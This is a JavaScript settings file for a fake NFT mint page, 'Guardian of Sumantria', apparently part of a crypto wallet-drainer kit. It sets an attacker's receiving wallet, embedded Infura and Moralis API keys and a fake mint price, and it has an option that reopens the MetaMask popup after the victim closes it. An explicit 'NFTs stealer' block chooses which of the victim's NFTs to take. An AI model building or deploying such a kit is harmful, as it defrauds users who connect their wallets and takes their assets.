const address = "0xba3D9c221029079c12f0d9946733aEe7407A4F6d";     // wallet address
const infuraId = "6857febcb05b4078b037e59a2702ddc5"     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = "Trk28BPmjElOvoblAzreTyGubz5s325MPqbkSrxHiYtpurLxsBKeg3Pu6wbrBcoB"   // x-api-key | https://moralis.io/ | For NFTs


const collectionInfo = {
    name: "Guardian of Sumantria - Mint Sale",
    title: "Mint Your Sumantria Below!", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "Now",
    socialMedia: {
        discord: "https://discord.com/nftsumantria",
        twitter: "https://twitter.com/NFTsumantria",
    },
    medias: {
        preview: "gee.gif",
        favicon: "favicon.jpg",
    },
    background: {
        type: "video",              // Supported types: image, video, color
        image: "bg.jpg",    // Image for image type, video preview for video type
        video: "vid.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.12,         // Price per NFT.
    totalSupply: 6777,   // Total supply of NFTs.
    totalMinted: 720,  // Total minted
    minUnits: 1,        // Min units to buy.
    maxUnits: 10,        // Max units to buy.
    askMintLoop: false,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.02,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 9999, // Maximum number of days to check for the last transactions.
    receiveAddress: "" // leave empty if you want to use the same address 
}

/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
